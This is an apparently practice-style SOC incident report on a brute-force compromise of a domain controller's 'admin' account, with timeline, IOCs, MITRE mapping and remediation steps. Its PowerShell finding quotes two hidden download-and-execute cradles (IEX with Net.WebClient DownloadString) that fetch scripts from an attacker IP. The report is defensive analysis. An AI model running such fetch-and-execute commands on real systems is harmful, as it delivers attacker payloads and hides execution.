# Security Incident Report
## SOC Mini-Engagement: Brute Force + Suspicious PowerShell Investigation

**Report Date:** 2024-03-04  
**Analyst:** Senior SOC Analyst  
**Classification:** CONFIDENTIAL  
**Incident Severity:** HIGH

---

## Executive Summary

This report documents the findings of a security investigation conducted on Windows infrastructure logs covering the period of March 4, 2024. The investigation identified two critical security incidents:

1. **Brute Force Attack**: A successful credential compromise on SRV-DC01 (Domain Controller) originating from IP 192.168.100.45
2. **Suspicious PowerShell Activity**: Multiple instances of malicious PowerShell execution with encoded commands and download cradles

The attacker successfully compromised the 'admin' account after 5 failed login attempts and subsequently executed malicious PowerShell scripts to download additional payloads. Immediate containment and remediation actions are recommended.

---

## Scope & Data Sources

### Investigation Period
- **Start:** 2024-03-04 08:15:23 UTC
- **End:** 2024-03-04 17:15:33 UTC
- **Duration:** ~9 hours

### Data Sources Analyzed
- Windows Security Event Logs (Event IDs: 4624, 4625, 4688, 4634)
- PowerShell Operational Logs
- Total Events Analyzed: 32 log entries

### Systems in Scope
- **SRV-DC01** - Domain Controller (Primary target)
- **WKS-001** - Workstation (User: jdoe)
- **WKS-002** - Workstation (Users: asmith, bwilson)

### User Accounts Analyzed
- admin (compromised)
- jdoe
- asmith
- bwilson
- svc_backup

---

## Key Findings

### Finding 1: Brute Force Attack - Domain Controller Compromise
**Severity:** HIGH  
**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing)


An attacker from IP address 192.168.100.45 successfully compromised the 'admin' account on the domain controller (SRV-DC01) through a brute force attack. The attack consisted of 5 consecutive failed login attempts followed by a successful authentication.

**Attack Details:**
- Target: SRV-DC01 (Domain Controller)
- Compromised Account: admin
- Source IP: 192.168.100.45
- Failed Attempts: 5
- Attack Duration: ~67 seconds
- Outcome: Successful compromise

**Timeline:**
- 10:12:05 UTC - First failed login attempt
- 10:12:18 UTC - Second failed attempt
- 10:12:31 UTC - Third failed attempt
- 10:12:44 UTC - Fourth failed attempt
- 10:12:57 UTC - Fifth failed attempt
- 10:13:10 UTC - Successful login (Network logon type)

### Finding 2: Malicious PowerShell Execution with Encoded Commands
**Severity:** HIGH  
**MITRE ATT&CK:** T1059.001 (PowerShell), T1027 (Obfuscated Files/Information), T1105 (Ingress Tool Transfer)

Multiple instances of suspicious PowerShell activity were detected on SRV-DC01 following the successful brute force attack. The PowerShell commands exhibited characteristics consistent with malware delivery and command-and-control activity.

**Incident 1 - Encoded Download Cradle:**
- Timestamp: 11:45:09 UTC
- Host: SRV-DC01
- User: admin
- Command: Encoded PowerShell command using Base64
- Decoded Content: `IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.45/payload.ps1')`
- Risk Score: 90/100
- Indicators: Encoded Command, Download Cradle, Execution Policy Bypass, No Profile

**Incident 2 - Hidden PowerShell with Download Cradle:**
- Timestamp: 15:12:33 UTC
- Host: SRV-DC01
- User: admin
- Command: `powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.45/malicious.ps1')`
- Risk Score: 80/100
- Indicators: Download Cradle, Hidden Window, Invoke-Expression

Both PowerShell executions attempted to download additional payloads from the attacker-controlled IP (192.168.100.45).

---

## Timeline of Events

| Timestamp (UTC) | Host | User | Event | Severity | Description |
|----------------|------|------|-------|----------|-------------|
| 10:12:05 | SRV-DC01 | admin | 4625 | Medium | Failed login attempt #1 from 192.168.100.45 |
| 10:12:18 | SRV-DC01 | admin | 4625 | Medium | Failed login attempt #2 from 192.168.100.45 |
| 10:12:31 | SRV-DC01 | admin | 4625 | Medium | Failed login attempt #3 from 192.168.100.45 |
| 10:12:44 | SRV-DC01 | admin | 4625 | Medium | Failed login attempt #4 from 192.168.100.45 |
| 10:12:57 | SRV-DC01 | admin | 4625 | Medium | Failed login attempt #5 from 192.168.100.45 |
| 10:13:10 | SRV-DC01 | admin | 4624 | HIGH | **Successful login from 192.168.100.45** |
| 11:45:08 | SRV-DC01 | admin | 4688 | Info | PowerShell process created |
| 11:45:09 | SRV-DC01 | admin | PowerShell | HIGH | **Encoded command with download cradle** |
| 15:12:33 | SRV-DC01 | admin | PowerShell | HIGH | **Hidden PowerShell with malicious download** |
| 17:15:33 | SRV-DC01 | admin | 4634 | Info | Admin logoff |

---

## Indicators of Compromise (IOCs)

### Network Indicators
| Type | Value | Context | Confidence |
|------|-------|---------|------------|
| IPv4 | 192.168.100.45 | Attacker source IP, C2 server | High |
| URL | http://192.168.100.45/payload.ps1 | Malicious payload download | High |
| URL | http://192.168.100.45/malicious.ps1 | Secondary payload download | High |

### Host Indicators
| Type | Value | Context |
|------|-------|---------|
| Compromised Account | admin@SRV-DC01 | Domain admin account compromised |
| Compromised Host | SRV-DC01 | Domain Controller - Critical asset |

### Behavioral Indicators
- Multiple failed login attempts (5+) within short timeframe
- PowerShell execution with `-EncodedCommand` parameter
- PowerShell execution with `-ExecutionPolicy Bypass`
- PowerShell execution with `-WindowStyle Hidden`
- Use of `Net.WebClient.DownloadString()` method
- Use of `Invoke-Expression (IEX)` for code execution
- Downloads from non-standard HTTP endpoints

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|----|---------| 
| Initial Access | Valid Accounts | T1078 | Brute force led to valid credential compromise |
| Credential Access | Brute Force: Password Guessing | T1110.001 | 5 failed attempts before success |
| Execution | PowerShell | T1059.001 | Multiple PowerShell executions post-compromise |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 encoded PowerShell commands |
| Command and Control | Ingress Tool Transfer | T1105 | Download of additional payloads via HTTP |

---

## Recommendations

### Immediate Actions (0-24 hours)


1. **Isolate Compromised Systems**
   - Immediately isolate SRV-DC01 from the network for forensic analysis
   - Preserve memory dumps and disk images before remediation

2. **Reset Compromised Credentials**
   - Force password reset for 'admin' account
   - Reset passwords for all privileged accounts as precautionary measure
   - Invalidate all active sessions for compromised accounts

3. **Block Malicious Infrastructure**
   - Block IP 192.168.100.45 at firewall/perimeter
   - Add IOCs to IDS/IPS signatures
   - Block URLs: http://192.168.100.45/payload.ps1 and http://192.168.100.45/malicious.ps1

4. **Hunt for Persistence Mechanisms**
   - Check scheduled tasks, services, and registry run keys on SRV-DC01
   - Review startup folders and WMI event subscriptions
   - Scan for unauthorized user accounts or group memberships

5. **Review Domain Controller Logs**
   - Analyze all admin account activity since 10:13:10 UTC
   - Check for unauthorized changes to Active Directory (user creation, group modifications)
   - Review GPO changes and domain trust relationships

### Short-term Actions (1-7 days)

1. **Deploy Enhanced Monitoring**
   - Implement the provided Sigma rules for brute force and PowerShell detection
   - Enable PowerShell script block logging across all systems
   - Configure alerts for failed login thresholds (3+ failures in 5 minutes)

2. **Conduct Threat Hunting**
   - Search for similar PowerShell patterns across all endpoints
   - Review network traffic logs for connections to 192.168.100.45
   - Analyze proxy logs for suspicious download activity

3. **Vulnerability Assessment**
   - Audit password policies (complexity, length, lockout thresholds)
   - Review account lockout policies (currently appears insufficient)
   - Assess privileged account management practices

4. **Forensic Analysis**
   - Perform full forensic analysis of SRV-DC01
   - Determine if additional payloads were successfully executed
   - Identify data exfiltration attempts

### Long-term Actions (1-3 months)

1. **Implement Account Lockout Policies**
   - Configure account lockout after 3-5 failed attempts
   - Set lockout duration to 30+ minutes
   - Implement progressive delays between authentication attempts

2. **Deploy Multi-Factor Authentication (MFA)**
   - Require MFA for all administrative accounts
   - Implement MFA for remote access (VPN, RDP)
   - Consider MFA for all user accounts

3. **Enhance PowerShell Security**
   - Enable PowerShell Constrained Language Mode
   - Implement application whitelisting (AppLocker/WDAC)
   - Configure PowerShell transcription logging
   - Restrict PowerShell execution to authorized users

4. **Network Segmentation**
   - Isolate Domain Controllers in dedicated VLAN
   - Implement jump boxes for administrative access
   - Deploy privileged access workstations (PAWs)

5. **Security Awareness Training**
   - Conduct phishing awareness training
   - Train administrators on secure PowerShell practices
   - Educate staff on password security and MFA importance

6. **Implement Privileged Access Management (PAM)**
   - Deploy PAM solution for credential vaulting
   - Implement just-in-time (JIT) privileged access
   - Enable session recording for privileged activities

---

## Assumptions & Limitations

### Assumptions
1. Log data provided is complete and accurate for the investigation period
2. System clocks are synchronized and timestamps are reliable
3. No log tampering or deletion occurred
4. The 'admin' account is a legitimate administrative account
5. IP 192.168.100.45 is external or attacker-controlled infrastructure

### Limitations
1. **Limited Visibility**: Analysis based solely on Windows Security and PowerShell logs; no network traffic analysis, EDR telemetry, or proxy logs available
2. **Payload Analysis**: Unable to analyze actual payload content (payload.ps1, malicious.ps1) as files were not recovered
3. **Lateral Movement**: Cannot confirm if attacker moved laterally to other systems beyond SRV-DC01
4. **Data Exfiltration**: No visibility into potential data exfiltration activities
5. **Attack Origin**: Cannot determine if 192.168.100.45 is the true attacker origin or a compromised intermediary
6. **Time Gap**: 9-hour log window may not capture full attack lifecycle (reconnaissance, post-exploitation)
7. **Benign Activity**: Some legitimate administrative activity may appear suspicious without full context

### Recommendations for Future Investigations
- Deploy comprehensive EDR solution across all endpoints
- Implement network traffic analysis (NTA) and full packet capture
- Enable detailed PowerShell logging (Module, Script Block, Transcription)
- Deploy SIEM with correlation rules for multi-stage attacks
- Implement file integrity monitoring (FIM) on critical systems

---

## Appendices

### Appendix A: Detection Rules
- Sigma rule for brute force detection: `detections/sigma_bruteforce.yml`
- Sigma rule for suspicious PowerShell: `detections/sigma_suspicious_powershell.yml`

### Appendix B: Investigation Outputs
- Findings summary: `output/findings_summary.csv`
- Brute force events: `output/brute_force_hits.csv`
- PowerShell events: `output/powershell_hits.csv`
- Full timeline: `output/timeline.csv`

### Appendix C: Investigation Script
- Python investigation script: `src/investigate.py`
- Utility functions: `src/utils.py`

---

**Report Prepared By:** Senior SOC Analyst  
**Review Status:** Final  
**Distribution:** Security Team, IT Management, Incident Response Team

---

*This report contains sensitive security information and should be handled according to organizational data classification policies.*
